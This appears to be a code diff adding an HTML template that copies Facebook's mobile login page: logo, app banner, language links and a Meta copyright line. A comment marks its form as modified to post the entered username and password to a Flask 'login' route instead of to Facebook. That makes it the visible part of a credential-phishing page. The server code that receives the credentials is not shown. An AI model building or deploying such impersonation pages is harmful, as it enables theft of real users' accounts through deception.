@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            color: #1c1e21;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Top Yellow Banner */
+        .banner {
+            background-color: #fffbe6;
+            border-bottom: 1px solid #ffe58f;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #4b4b4b;
+        }
+
+        .phone-icon {
+            width: 20px;
+            height: 28px;
+            border: 2px solid #555;
+            border-radius: 4px;
+            position: relative;
+            background-color: #e2e2e2;
+            flex-shrink: 0;
+        }
+
+        .phone-icon::after {
+            content: '';
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            width: 10px;
+            height: 14px;
+            background-color: #4b66a0;
+            border-radius: 1px;
+        }
+
+        /* Main Container */
+        .main-content {
+            padding: 20px 16px;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+        }
+
+        .fb-logo {
+            font-family: Arial, Helvetica, sans-serif;
+            color: #1877f2;
+            font-size: 32px;
+            font-weight: bold;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+
+        /* Form */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 48px;
+            padding: 0 14px;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            background-color: #f5f6f7;
+            font-size: 14px;
+            outline: none;
+            color: #1d2129;
+        }
+
+        .input-field::placeholder {
+            color: #8d949e;
+        }
+
+        .input-field:focus {
+            border-color: #1877f2;
+            background-color: #fff;
+        }
+
+        .login-btn {
+            width: 100%;
+            height: 44px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 2px;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin-top: 12px;
+            margin-bottom: 16px;
+        }
+
+        .forgot-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 12px 0 20px 0;
+            color: #4b4f56;
+            font-size: 13px;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #ccd0d5;
+        }
+
+        .divider span {
+            padding: 0 12px;
+        }
+
+        .create-btn-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+
+        .create-btn {
+            width: 75%;
+            height: 38px;
+            background-color: #ffffff;
+            border: 1px solid #ccd0d5;
+            border-radius: 4px;
+            color: #000000;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Footer / Languages */
+        .footer {
+            margin-top: auto;
+            padding: 40px 16px 20px 16px;
+            width: 100%;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .languages-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            text-align: center;
+            row-gap: 8px;
+            font-size: 12px;
+            color: #576b95;
+            margin-bottom: 20px;
+        }
+
+        .languages-grid a {
+            color: #576b95;
+            text-decoration: none;
+        }
+
+        .languages-grid .active {
+            color: #90949c;
+        }
+
+        .plus-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            border: 1px solid #576b95;
+            border-radius: 2px;
+            color: #576b95;
+            font-size: 14px;
+            line-height: 1;
+            margin: 0 auto;
+        }
+
+        .copyright {
+            text-align: center;
+            font-size: 12px;
+            color: #80848c;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="banner">
+        <div class="phone-icon"></div>
+        <span>Get Facebook for Android and browse faster.</span>
+    </div>
+
+    <div class="main-content">
+        <div class="fb-logo">facebook</div>
+
+        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
+        <form class="login-form" action="{{ url_for('login') }}" method="POST">
+            <input type="text" class="input-field" name="username" placeholder="Mobile number or email address" required />
+            <input type="password" class="input-field" name="password" placeholder="Password" required />
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <div class="forgot-link">
+            <a href="#">Forgotten password?</a>
+        </div>
+
+        <div class="divider">
+            <span>or</span>
+        </div>
+
+        <div class="create-btn-wrapper">
+            <button type="button" class="create-btn">Create new account</button>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="languages-grid">
+            <div><span class="active">English (UK)</span></div>
+            <div><a href="#">தமிழ்</a></div>
+            <div><a href="#">తెలుగు</a></div>
+            <div><a href="#">ಕನ್ನಡ</a></div>
+            <div><a href="#">اردو</a></div>
+            <div><a href="#">हिन्दी</a></div>
+            <div><a href="#">മലയാളം</a></div>
+            <div><div class="plus-icon">+</div></div>
+        </div>
+
+        <div class="copyright">
+            Meta © 2026
+        </div>
+    </footer>
+
+</body>
+</html>
